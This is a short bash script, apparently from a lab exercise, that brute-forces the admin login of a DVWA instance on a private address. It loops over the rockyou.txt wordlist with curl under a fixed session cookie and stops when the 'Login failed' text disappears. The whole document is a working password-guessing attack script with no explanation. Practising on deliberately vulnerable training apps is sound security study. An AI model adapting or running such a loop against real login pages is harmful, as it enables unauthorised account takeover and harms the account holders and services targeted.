#!/bin/bash
COOKIE="PHPSESSID=579778505a231f53720487c5869a77b8; security=low"
for pass in $(cat /usr/share/wordlists/rockyou.txt); do
  resp=$(curl -s -b "$COOKIE" --get "http://192.168.88.134/dvwa/vulnerabilities/brute/" --data-urlencode "username=admin" --data-urlencode "password=$pass" --data-urlencode "Login=Login")
  if ! echo "$resp" | grep -q "Login failed"; then
    echo "FOUND PASSWORD: $pass"
    break
  fi
done

